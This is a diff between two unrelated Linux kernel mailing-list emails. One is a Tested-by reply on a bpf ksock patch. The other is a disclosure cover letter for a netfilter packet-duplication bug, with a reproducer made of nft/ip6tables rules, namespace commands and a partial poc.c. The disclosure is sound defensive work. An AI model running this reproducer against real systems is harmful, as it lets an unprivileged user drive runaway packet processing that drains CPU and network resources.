@@ -1,360 +1,340 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pg1-f169.google.com (mail-pg1-f169.google.com [209.85.215.169])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 904A647DD77;
-	Thu, 15 Oct 2026 07:36:31 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2A23B49DBB1
+	for <bpf@vger.kernel.org>; Thu, 15 Oct 2026 07:45:01 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.169
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1792049793; cv=none; b=Z0Lv7US6vVS7AHwuA5ZNHIY0SUJt8dJDybR1/8drerNWp/xZTKAlT6FrPriuf+G+3Ku7nx4ttwkTB/cmtSAeem+2QmmEjFD9t++47UvPyImmAWfLhBPBZ/9ycoRBMizHOx7jG2D+eumX0v9atVm7yfbMgVgCBAbZvmGAEu6FjKU=
+	t=1792050312; cv=none; b=u0JWA4N3i7gCBdpRRbHHz23ru0RIN1DkeJRm6Ybj/X+U2F9L7gm5pvsw3eRiyzqtGB/CcyCx8AIjYSI6g9AU5ixoDh+8h83zbdsuYkPS+eWoqR/rt60MfXqFYBhPRhJ3nJAXbe0D7RK4OQQRj5tIFpK8Mje7qmqn+PPwgtfup94=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1792049793; c=relaxed/simple;
-	bh=A2hwbXHjZ1Kq1j167ZcjTSKL0LVvmWeVfLWvBZ/i/NA=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=Dqp3cZ4320uAgHKPtKFUNKDgYBjBrcwJbSml0SGcS1QsBk16HAnJrOb81lfKzSnrgJeDd4a9yyvhm040NkosuFnu+i/NAwHle3yoyY+nNllHuTK8s6uiJsqCw757GBo7J33ouvAviX7bR1qXuRE3FS45jAhghAt/BUSJXT8Jkhs=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=V6c+AK1E; arc=none smtp.client-ip=100.103.45.18
+	s=arc-20240116; t=1792050312; c=relaxed/simple;
+	bh=idWN7cBcsaFBF247ym2WF7oMSLDflFPIND3hmNaYCa8=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=uTx5P4bN3nPIBjc0kdlG2TIxfioNgsBlVg/4T6amvfahsbAah9P9j94/Rmheq/AQsv4owtRZT+QZVsXzA0MtB3OaZ0DWQzEzKB6XnwtbZbbx2yJw6WZuR7P5CAbtPdLxTLVQL8RAGJl95NKpE84HvTXSWtnoEZAVhFm/sOXdmGw=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Iw50In6K; arc=none smtp.client-ip=209.85.215.169
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="V6c+AK1E"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id A0B931F000C4;
-	Thu, 15 Oct 2026 07:36:26 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1792049791;
-	bh=BYTdeY/6CZRMtx6tP1h0+La063FzWI0YaHmLJ6qbX78=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=V6c+AK1E7T4zaWNwyzEUOiXA/5gEkS83hdD4a6TOemv4QL/SOXmUUI89vpmOpNK2Z
-	 9Ax97Jgqw/RgHpLpXbAlF4Fsxozov+sp4LrcMDNOysjFcBMcxK+3iBf5zv/WVXf1XZ
-	 3FH8zLfIYrvIUnHUZlFtuUcYYD/lwUtpEMk7XSiMJLct+awV4S5BFefXF7q/mA6TJ5
-	 7RGU4i/rrDhaC/alwtmzIsUPr0LIyLrLpc3ITv4uFZV+K4CZsDDlmkjAFuRF4wjc5f
-	 rGY5kzq/W0+j+FL2KBURTjUUf9N7gPmtdOqPUOABd7E5mtP/gYcepiLzGEnA6HV6yR
-	 84A3UegTZXLng==
-Message-ID: <5d8003d3-af63-4dc6-83f3-890efd2e0aa8@kernel.org>
-Date: Thu, 15 Oct 2026 08:36:24 +0100
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Iw50In6K"
+Received: by mail-pg1-f169.google.com with SMTP id 41be03b00d2f7-cd623dfe420so1436035a12.0
+        for <bpf@vger.kernel.org>; Thu, 15 Oct 2026 00:45:01 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1792050301; x=1792655101; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
+        b=Iw50In6KsDzaj3bgjCO/Sbfp/4agjgCWZL8y40cGa6FkHxFGvp3IG+xVewff1ORpd6
+         mvR+NGCETuYpG9Mvu6iJyX/DjFSU1wX/y67E2VL5WsA2/9irB5/ffZAR8L9nIX5RSoFS
+         TsNncW1UZKaR+E22cf1IGR6Du3N1SgRvnPxPPJoFgUZOGuDboOFCy/fVyBVwe+9Acspg
+         qOWboNZPhFFC59n8Z4VXUwPW1nqlhVsNhRvRQDD+HbivTIf/PfzTwQw9JojJDt6wpK/s
+         3PAl25viMYrQxLAPRZc+oQzGAItxOR/BT2LOgon8Z6FGZbzCzAYH4g6MXHxzVH1qJzMO
+         /DqQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1792050301; x=1792655101;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
+        b=azN++47wWKVakR3MQnbrFzxSdNMOqoxavC9+8O3Q9ZGjtT1VnYC7guykyQzNPDToCI
+         vSEvcUWW3sti+873ZJCtbh4PiQ0EhpdwqABfxkoEqWstz0M2ehs1YqjYp4MsgcQdYRTf
+         /w000qHulZJw714GMmvQll/iI37tEmz1jphovFbdDe0LCp71cig0FME3Go710EbyGOE6
+         HXwXiTsft+XxbUZ/Kzt/gb7lt6jodiv2mUW2P3jJW8DxzFJEyNF3D8y7ChejEFWJQ7sv
+         dcVBwhdIuqKI8Sixq+IPDntCIjjZ7MD68p2Rt6iZry5RyaJwV2LyrjTuSKfRGNxlI2se
+         6Gbw==
+X-Forwarded-Encrypted: i=1; AKwUvBymkzZhlVxqoSj/ExoR4RP15Qq2B214fj/tdR5DqfWm8qfWoxsjVVwj8Re/bP5oqqESaCg=@vger.kernel.org
+X-Gm-Message-State: AFq9FYKuFJG55+uj2wGW+CX1nJj5/E6CBbDzymRIgadrfrt+q2FavdOg
+	KafeVvXEL9Y7psUdFRV3TPemYXcVWwRldOO6ims2NyX6u+0WyXHwnbDInrFcr7tXoeGc
+X-Gm-Gg: AYBFou2GO3993qNHlZl56KXWiHlBCMTlbOMOUQDbNNjnRrCX7K1nAZoul869UHOKkrN
+	pttbi3G8E0GaqLcNiVXnrt0r6HCypQ+hG16IDIgVVQHetcPAm6nXxV24wqjXYrYKqkfu/ijFYyZ
+	eDI2EJW8kV6J9cuiBY0PuQ6Sr5qfT9m9kayj7oMgLRgZwL0/XFSn9mV+rEhSoYzc+d5IAjCPaPr
+	1yCexSbOhrO2Ds0h/t7xzRcMutKeMcuXPrgzf+lDdfBJi0WVI0YB4Zesfiw9KwrTTD8+eQJqi6V
+	YcnYHYckNWeedvC4/Za68SlrrADuWTMLxuT+Nu/8fRaH7k8fK0le2lBNC6GhETig4r0qaePFzQ4
+	QeM+5TG7CWyRbTOwu5uUe45H6E9Mb1X7RJb5sZVUpeXyei1mKy6BeAun5K1Drmpx7y0KnJBSlCe
+	VqpH29Z4BOd4bdrVKhxelSem4Krz2XVTaEraGmFKAOnplxuNQb+ry8adlwl6DoT0MsVnoTy7MSb
+	psA3sUHh0F+S7lxGwIojgOn50etWA==
+X-Received: by 2002:a17:90b:4d0b:b0:3ab:1285:dfd6 with SMTP id 98e67ed59e1d1-3ac6f2952e2mr4157445a91.38.1792050300873;
+        Thu, 15 Oct 2026 00:45:00 -0700 (PDT)
+Received: from 24c857d0c3be.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac93849da5sm1636831a91.4.2026.10.15.00.44.50
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 15 Oct 2026 00:44:59 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netfilter-devel@vger.kernel.org,
+	virtualization@lists.linux.dev,
+	intel-wired-lan@lists.osuosl.org,
+	bpf@vger.kernel.org
+Cc: pablo@netfilter.org,
+	fw@strlen.de,
+	phil@nwl.cc,
+	davem@davemloft.net,
+	edumazet@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	kaber@trash.net,
+	jengelh@medozas.de,
+	andrew+netdev@lunn.ch,
+	mst@redhat.com,
+	jasowangio@gmail.com,
+	eperezma@redhat.com,
+	xuanzhuo@linux.alibaba.com,
+	aleksander.lobakin@intel.com,
+	ast@kernel.org,
+	daniel@iogearbox.net,
+	hawk@kernel.org,
+	john.fastabend@gmail.com,
+	sdf@fomichev.me,
+	magnus.karlsson@intel.com,
+	maciej.fijalkowski@intel.com,
+	willemb@google.com,
+	alice.kernel@fastmail.im,
+	eilaimemedsnaimel@gmail.com,
+	imv4bel@gmail.com,
+	shiming.cheng@mediatek.com,
+	sd@queasysnail.net,
+	vega@nebusec.ai,
+	root@tr0jan.top,
+	zihanx@nebusec.ai
+Subject: [PATCH nf v8 0/3] netfilter: bound asynchronous packet duplication
+Date: Thu, 15 Oct 2026 07:43:06 +0000
+Message-ID: <cover.1792048855.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH bpf-next v4] bpf: allow ksock connect/send calls from wq
-To: Mahe Tardy <mahe.tardy@gmail.com>, bpf@vger.kernel.org
-Cc: andrii@kernel.org, ast@kernel.org, daniel@iogearbox.net,
- davem@davemloft.net, eddyz87@gmail.com, edumazet@google.com,
- john.fastabend@gmail.com, kuba@kernel.org, liamwisehart@meta.com,
- martin.lau@linux.dev, pabeni@redhat.com, song@kernel.org,
- netdev@vger.kernel.org, sdf.kernel@gmail.com, ameryhung@gmail.com,
- kuniyu@google.com, memxor@gmail.com, jiayuan.chen@linux.dev,
- alan.maguire@oracle.com
-References: <20261014095743.35891-1-mahe.tardy@gmail.com>
-Content-Language: en-GB
-From: Alan Maguire <almagui@kernel.org>
-In-Reply-To: <20261014095743.35891-1-mahe.tardy@gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 
-On 10/14/26 10:57 AM, Mahe Tardy wrote:
-> In the initial implementation in '7ae4eb14c5f9 ("bpf: Add ksock
-> kfuncs")', it was decided to let the ksock kfuncs go through the LSM
-> hooks instead of by-passing them, and thus to disallow the use of the
-> kfuncs from asynchronous workqueues as the credentials would be
-> different than the task context that triggered the kfuncs.
-> 
-> After some discussions, in particular at Plumbers 2026 at the
-> presentation introducing this new ksock API[^1], it was agreed that
-> by-passing the LSM from socket created by BPF programs should be okay
-> and thus that the process context switch from kthread executing the
-> workqueues wouldn't be an issue.
-> 
-> For now, the ksock kfuncs still trigger the LSM hooks but we relax the
-> constraint on not using the workqueues as it will be useful for users
-> triggering connect() or send() from non-sleepable programs (like
-> tracing, support will be extended in future patches).
-> 
-> Also adapt test_ksock_wq() added in 'c93cbdb13f99 ("selftests/bpf: Add
-> ksock test for async callback guard")' to test that the connect() and
-> send() kfuncs are now allowed and work when called from workqueues.
-> 
-> Note that bpf_ksock_create() still checks for workqueue context
-> execution and makes sure the current->nsproxy is defined as we rely on
-> the network namespace to be defined (could be NULL in the case do_exit()
-> was called on the task before the wq was scheduled) and to be the one
-> from the task that triggered the SYSCALL bpf prog.
-> 
-> [^1]: https://lpc.events/event/20/contributions/2430/
-> 
-> Signed-off-by: Mahe Tardy <mahe.tardy@gmail.com>
+Hi Linux kernel maintainers,
 
-Tested-by: Alan Maguire (Oracle) <almagui@kernel.org>
+We found and validated an issue in netfilter packet duplication. The bug
+is reachable by an unprivileged user in user and network namespaces.
+Bounded tests exercised the fixes. Non-duplication packet semantics are
+intended to remain unchanged. MIRRED flow offload for affected netdev dup
+rules is rejected because it cannot enforce the duplication-depth limit.
 
-Using -EOPNOTSUPP instead of -EPERM makes sense to me too as you say
-in the followup.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Thanks again for doing this Mahe!
-> ---
-> I resent v2 as v3 instead of this fix by mistake, ignore v3.
-> v3: https://lore.kernel.org/bpf/20261014091450.19107-1-mahe.tardy@gmail.com/
-> 
->  net/core/bpf_ksock.c                          | 27 +------
->  .../selftests/bpf/prog_tests/ksock_wq.c       | 29 +++++--
->  tools/testing/selftests/bpf/progs/ksock_wq.c  | 77 +++++++++++++++----
->  3 files changed, 92 insertions(+), 41 deletions(-)
-> 
-> diff --git a/net/core/bpf_ksock.c b/net/core/bpf_ksock.c
-> index e9943aeeadd3..f74968397798 100644
-> --- a/net/core/bpf_ksock.c
-> +++ b/net/core/bpf_ksock.c
-> @@ -37,15 +37,6 @@ static void ksock_release_work_fn(struct work_struct *work)
->  	kfree(ks);
->  }
-> 
-> -static bool bpf_ksock_has_user_task_context(void)
-> -{
-> -	/*
-> -	 * Task work can run from do_exit() after exit_nsproxy_namespaces()
-> -	 * cleared current->nsproxy, while current is still not a kthread.
-> -	 */
-> -	return !(current->flags & PF_KTHREAD) && current->nsproxy;
-> -}
-> -
->  __bpf_kfunc_start_defs();
-> 
->  /**
-> @@ -59,7 +50,7 @@ __bpf_kfunc_start_defs();
->   * This function may sleep (sock_create), so it can only be used
->   * in sleepable BPF programs (SYSCALL).
->   * It cannot be called from a BPF workqueue callback because that callback
-> - * does not retain the invoking task's namespace or security context.
-> + * does not retain the invoking task's namespace.
->   *
->   * @opts:	Pointer to struct bpf_ksock_create_opts with socket parameters.
->   * @opts__sz:	Size of the opts struct.
-> @@ -73,13 +64,9 @@ bpf_ksock_create(const struct bpf_ksock_create_opts *opts, u32 opts__sz,
->  	struct bpf_ksock *ks;
->  	int err;
-> 
-> -	/*
-> -	 * sock_create() derives the network namespace, credentials, and cgroup
-> -	 * from current. Kernel threads, including BPF workqueue callbacks, do
-> -	 * not carry the context of the task that invoked the BPF program.
-> -	 */
-> -	if (!bpf_ksock_has_user_task_context()) {
-> -		err = -EOPNOTSUPP;
-> +	/* sock_create() derives the network namespace from current. */
-> +	if ((current->flags & PF_KTHREAD) || !current->nsproxy) {
-> +		err = -EPERM;
->  		goto err_out;
->  	}
-> 
-> @@ -165,9 +152,6 @@ __bpf_kfunc int bpf_ksock_connect(struct bpf_ksock *ks,
->  	struct sockaddr_storage sa;
->  	int addrlen;
-> 
-> -	if (!bpf_ksock_has_user_task_context())
-> -		return -EOPNOTSUPP;
-> -
->  	if (!addr || addr__sz != sizeof(*addr))
->  		return -EINVAL;
-> 
-> @@ -247,9 +231,6 @@ __bpf_kfunc int bpf_ksock_send(struct bpf_ksock *ks, const void *data,
->  	};
->  	int ret;
-> 
-> -	if (!bpf_ksock_has_user_task_context())
-> -		return -EOPNOTSUPP;
-> -
->  	ret = kernel_sendmsg(ks->sock, &msg, &iov, 1, data__sz);
-> 
->  	return ret;
-> diff --git a/tools/testing/selftests/bpf/prog_tests/ksock_wq.c b/tools/testing/selftests/bpf/prog_tests/ksock_wq.c
-> index d6dc20b8f95b..cb50f9a1be2e 100644
-> --- a/tools/testing/selftests/bpf/prog_tests/ksock_wq.c
-> +++ b/tools/testing/selftests/bpf/prog_tests/ksock_wq.c
-> @@ -4,6 +4,7 @@
->  #include <unistd.h>
-> 
->  #include "test_progs.h"
-> +#include "network_helpers.h"
->  #include "ksock_wq.skel.h"
-> 
->  #define CALLBACK_WAIT_RETRIES 1000
-> @@ -13,13 +14,22 @@ void test_ksock_wq(void)
->  {
->  	LIBBPF_OPTS(bpf_test_run_opts, opts);
->  	struct ksock_wq *skel;
-> +	char recv_data[sizeof(skel->data->send_data)];
->  	u32 callback_done;
-> -	int err, i;
-> +	int err, i, port, rfd;
-> 
->  	skel = ksock_wq__open_and_load();
->  	if (!ASSERT_OK_PTR(skel, "ksock_wq open and load"))
->  		return;
-> 
-> +	rfd = start_server(AF_INET, SOCK_DGRAM, "127.0.0.1", 0, 1000);
-> +	if (!ASSERT_OK_FD(rfd, "receiver socket"))
-> +		goto out;
-> +	port = get_socket_local_port(rfd);
-> +	if (!ASSERT_GE(port, 0, "receiver port"))
-> +		goto out;
-> +	skel->bss->remote_port = port;
-> +
->  	err = bpf_prog_test_run_opts(bpf_program__fd(skel->progs.ksock_wq_start),
->  				     &opts);
->  	if (!ASSERT_OK(err, "run ksock_wq_start"))
-> @@ -28,18 +38,27 @@ void test_ksock_wq(void)
->  		goto out;
-> 
->  	for (i = 0; i < CALLBACK_WAIT_RETRIES; i++) {
-> -		if (__atomic_load_n(&skel->bss->callback_done, __ATOMIC_ACQUIRE))
-> +		if (__atomic_load_n(&skel->bss->callback_done, __ATOMIC_ACQUIRE) == 2)
->  			break;
->  		usleep(CALLBACK_WAIT_US);
->  	}
->  	callback_done = __atomic_load_n(&skel->bss->callback_done,
->  					__ATOMIC_ACQUIRE);
-> -	if (!ASSERT_EQ(callback_done, 1, "workqueue callback completed"))
-> +	if (!ASSERT_EQ(callback_done, 2, "workqueue callbacks completed"))
->  		goto out;
-> 
-> -	ASSERT_EQ(skel->bss->create_err, -EOPNOTSUPP,
-> -		  "workqueue create rejected");
-> +	ASSERT_EQ(skel->bss->create_ret, -EPERM, "workqueue create rejected");
-> +
-> +	if (!ASSERT_EQ(skel->bss->connect_send_ret, sizeof(recv_data),
-> +		       "workqueue send bytes"))
-> +		goto out;
-> +	err = recv(rfd, recv_data, sizeof(recv_data), 0);
-> +	if (ASSERT_EQ(err, sizeof(recv_data), "recv len"))
-> +		ASSERT_MEMEQ(recv_data, skel->data->send_data, sizeof(recv_data),
-> +			     "payload match");
-> 
->  out:
-> +	if (rfd >= 0)
-> +		close(rfd);
->  	ksock_wq__destroy(skel);
->  }
-> diff --git a/tools/testing/selftests/bpf/progs/ksock_wq.c b/tools/testing/selftests/bpf/progs/ksock_wq.c
-> index 16a1873d132e..6ec6103e2518 100644
-> --- a/tools/testing/selftests/bpf/progs/ksock_wq.c
-> +++ b/tools/testing/selftests/bpf/progs/ksock_wq.c
-> @@ -2,9 +2,11 @@
->  /* Copyright (c) 2026 Isovalent */
-> 
->  #include "vmlinux.h"
-> +#include <bpf/bpf_endian.h>
->  #include <bpf/bpf_helpers.h>
->  #include "bpf_experimental.h"
->  #include "bpf_tracing_net.h"
-> +#include "bpf_misc.h"
->  #include "errno.h"
->  #include "ksock_common.h"
-> 
-> @@ -14,15 +16,19 @@ struct ksock_wq_value {
-> 
->  struct {
->  	__uint(type, BPF_MAP_TYPE_ARRAY);
-> -	__uint(max_entries, 1);
-> +	__uint(max_entries, 2);
->  	__type(key, u32);
->  	__type(value, struct ksock_wq_value);
->  } work_map SEC(".maps");
-> 
-> -int create_err;
-> +char send_data[] = "hello from bpf workqueue";
-> +
-> +__be16 remote_port;
-> +int connect_send_ret;
-> +int create_ret;
->  u32 callback_done;
-> 
-> -static int ksock_wq_callback(void *map, int *key, void *value)
-> +static int ksock_wq_create(void *map, int *key, void *value)
->  {
->  	struct bpf_ksock_create_opts opts = {
->  		.family = AF_INET,
-> @@ -35,7 +41,32 @@ static int ksock_wq_callback(void *map, int *key, void *value)
->  	ks = bpf_ksock_create(&opts, sizeof(opts), &err);
->  	if (ks)
->  		bpf_ksock_release(ks);
-> -	create_err = err;
-> +	create_ret = err;
-> +	__sync_fetch_and_add(&callback_done, 1);
-> +	return 0;
-> +}
-> +
-> +static int ksock_wq_connect_send(void *map, int *key, void *value)
-> +{
-> +	union bpf_ksock_addr addr = {
-> +		.sin = {
-> +			.sin_family = AF_INET,
-> +			.sin_port = remote_port,
-> +			.sin_addr.s_addr = bpf_htonl(0x7f000001),
-> +		},
-> +	};
-> +	struct bpf_ksock *ks;
-> +	int err = -ENOENT;
-> +
-> +	ks = ksock_ctx_get();
-> +	if (!ks)
-> +		goto out;
-> +	err = bpf_ksock_connect(ks, &addr, sizeof(addr));
-> +	if (!err)
-> +		err = bpf_ksock_send(ks, send_data, sizeof(send_data));
-> +	bpf_ksock_release(ks);
-> +out:
-> +	connect_send_ret = err;
->  	__sync_fetch_and_add(&callback_done, 1);
->  	return 0;
->  }
-> @@ -43,20 +74,40 @@ static int ksock_wq_callback(void *map, int *key, void *value)
->  SEC("syscall")
->  int ksock_wq_start(void *ctx)
->  {
-> +	struct bpf_ksock_create_opts opts = {
-> +		.family = AF_INET,
-> +		.type = SOCK_DGRAM,
-> +		.protocol = IPPROTO_UDP,
-> +	};
->  	struct ksock_wq_value *value;
-> -	u32 key = 0;
-> -	int err;
-> +	u32 key __aligned(8) = 0;
-> +	struct bpf_ksock *ks;
-> +	int err = 0;
-> 
-> -	value = bpf_map_lookup_elem(&work_map, &key);
-> -	if (!value)
-> -		return -ENOENT;
-> -	err = bpf_wq_init(&value->work, &work_map, 0);
-> -	if (err)
-> +	ks = bpf_ksock_create(&opts, sizeof(opts), &err);
-> +	if (!ks)
->  		return err;
-> -	err = bpf_wq_set_callback(&value->work, ksock_wq_callback, 0);
-> +	err = ksock_ctx_insert(ks);
->  	if (err)
->  		return err;
-> -	return bpf_wq_start(&value->work, 0);
-> +	for (key = 0; key < 2; key++) {
-> +		value = bpf_map_lookup_elem(&work_map, &key);
-> +		if (!value)
-> +			return -ENOENT;
-> +		err = bpf_wq_init(&value->work, &work_map, 0);
-> +		if (err)
-> +			return err;
-> +		if (key)
-> +			err = bpf_wq_set_callback(&value->work, ksock_wq_create, 0);
-> +		else
-> +			err = bpf_wq_set_callback(&value->work, ksock_wq_connect_send, 0);
-> +		if (err)
-> +			return err;
-> +		err = bpf_wq_start(&value->work, 0);
-> +		if (err)
-> +			return err;
-> +	}
-> +	return 0;
->  }
-> 
->  char __license[] SEC("license") = "GPL";
-> --
-> 2.43.0
+---- details below ----
+
+Bug details:
+
+The IPv4 and IPv6 duplication helpers use a task-local guard while a cloned
+packet traverses output hooks. If NFQUEUE suspends that traversal, the
+output call can return and clear the guard before a later verdict resumes
+the remaining hooks. The resumed packet can reach another duplication
+consumer without the original guard. This can cause repeated packet
+processing and consume CPU and network resources. Patch 1 records the
+guard in the queue entry and restores it during reinjection. It keeps
+bottom halves disabled during the reinjection traversal, restoring the
+verdict task state before reenabling them.
+
+The netdev nft dup path has a separate synchronous transmit recursion
+counter. It does not accompany a duplicated skb through asynchronous
+software receive paths. Patch 2 carries a bounded duplication depth through
+skb and supported XDP conversions, resets it on reused buffers, and rejects
+MIRRED flow offload where the software depth cannot be enforced. This scope
+covers software skb/XDP continuity, not packet loops through physical
+hardware or userspace device round trips.
+
+At PRE_ROUTING and LOCAL_IN, the IPv4 and IPv6 helpers decrement TTL or
+hop limit on the copy. Patch 3 stops creating copies when the value is
+<= 1, so the decrement cannot reach zero or wrap a zero value to the
+maximum. The three patches address the NFQUEUE reinjection, software
+netdev receive, and ingress TTL/hop-limit paths, respectively. The patch
+does not intend to change packet semantics for unrelated traffic; it also
+rejects affected MIRRED flow offload because it cannot enforce the
+netdev duplication-depth limit.
+
+Validation:
+
+The v8 series was built on nf.git main at
+ab699d296e066eb64f51d2a8a1d42237a3b186c8 and booted in a 2-vCPU,
+2-GiB QEMU guest as 7.3.0-rc5-g9a13bdbfd108. In bounded user/network
+namespace runs, the IPv4 and IPv6 nft dup/NFQUEUE tests each completed
+three callbacks with three successful verdicts and no verdict failures.
+A separate IPv4 run sent three UDP datagrams and completed nine callbacks
+with nine successful verdicts; the nft counters showed nine visits at
+each configured dup rule. These are bounded validation runs.
+
+For netdev dup, a native veth/XDP_TX-to-XDP_PASS test reached the
+first four depth-coded rules once each and did not reach the next two.
+The XDP_PASS control test without the transmit loop reached its single
+dup rule four times. The IPv4 TTL test observed eight matching packets
+and no TTL-0 or TTL-255 packets. The filtered IPv6 test observed eight
+matching packets and no hop-limit-0 packets; its one hop-limit-255 count
+was unrelated NDP traffic and is not evidence for the dup path. An IPv6
+xt_TEE/NFQUEUE test ran in a non-initial user/network namespace: one UDP
+datagram produced two callbacks, both accepted successfully. The guest
+test setup used ip6tables-legacy and pre-created its xtables lock file
+with mode 0666 so the unprivileged test process could open the lock.
+
+An unpatched-baseline bounded run by an unprivileged user in user and
+network namespaces reached 1,018,782 NFQUEUE callbacks in 61.643
+seconds. The callback counter is incremented before nfq_set_verdict(),
+so this is a callback count, not a successful-verdict count. This
+observed repeated packet processing and resource consumption.
+
+Reproducer:
+
+    gcc -O2 -o nfq_accept poc.c -lnetfilter_queue
+    unshare -Urn /bin/bash
+
+The NFQUEUE trigger requires a userspace verdict process, while the netdev
+test installs XDP programs and exercises veth skb/XDP conversion. Those
+setup and verdict interactions are not expressible as a standalone
+packetdrill exchange. The reproducer below covers the NFQUEUE path; the
+separate bounded TTL/hop-limit and netdev/XDP validation results are
+summarized above.
+
+The following commands ran as an unprivileged user in a new user/network
+namespace. First create a veth pair and assign 198.18.0.1/24 to v0 and
+198.18.0.2/24 to v1, then bring both links up. Install these output hooks:
+
+    nft add table ip t
+    nft 'add chain ip t dup1 { type filter hook output priority raw; policy accept; }'
+    nft 'add chain ip t queue1 { type filter hook output priority mangle; policy accept; }'
+    nft 'add chain ip t dup2 { type filter hook output priority filter; policy accept; }'
+    nft add rule ip t dup1 udp dport 5555 counter dup to 198.18.0.2 device v0
+    nft add rule ip t queue1 udp dport 5555 queue num 0
+    nft add rule ip t dup2 udp dport 5555 counter dup to 198.18.0.2 device v0
+
+Start the verdict process in the background, send three UDP datagrams to
+198.18.0.2 port 5555, then wait for the helper to exit:
+
+    ./nfq_accept 1 4 &
+    q=$!
+    python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); [s.sendto(b"x",("198.18.0.2",5555)) for _ in range(3)]'
+    wait "$q"
+
+The included helper returns NF_ACCEPT for each queued packet and reports
+callback and verdict counts.
+
+For the IPv6 xt_TEE test, the same helper was run in a non-initial
+user/network namespace after creating a veth pair with fd00::1/64 on v0
+and fd00::2/64 on v1. The guest test fixture pre-created
+/run/xtables.lock with mode 0666 as guest root:
+
+    touch /run/xtables.lock
+    chmod 0666 /run/xtables.lock
+
+The rules and one-packet trigger were:
+
+    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j TEE --gateway fd00::2
+    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j NFQUEUE --queue-num 0
+    ./nfq_accept 1 6 &
+    q=$!
+    python3 -c 'import socket; s=socket.socket(socket.AF_INET6,socket.SOCK_DGRAM); s.sendto(b"x",("fd00::2",5556))'
+    wait "$q"
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <signal.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/time.h>
+#include <unistd.h>
+#define NF_ACCEPT 1
+#define NF_DROP 0
+#define NF_REPEAT 4
+#define NF_STOP 5
+#include <libnetfilter_queue/libnetfilter_queue.h>
+
+static volatile sig_atomic_t stop;
+static unsigned long callbacks, verdict_ok, verdict_fail, repeats, drops;
+static const char *mode = "accept";
+static struct nfq_q_handle *queue;
+static void alarm_handler(int sig) { (void)sig; stop = 1; }
+static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
+              struct nfq_data *nfa, void *data)
+{
+    (void)nfmsg; (void)data;
+    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
+    if (!ph) return 0;
+    uint32_t id = ntohl(ph->packet_id);
+    callbacks++;
+    if (!strcmp(mode, "slow")) usleep(100000);
+    uint32_t verdict = NF_ACCEPT;
+    if (!strcmp(mode, "repeat-first") && callbacks == 1) { verdict = NF_REPEAT; repeats++; }
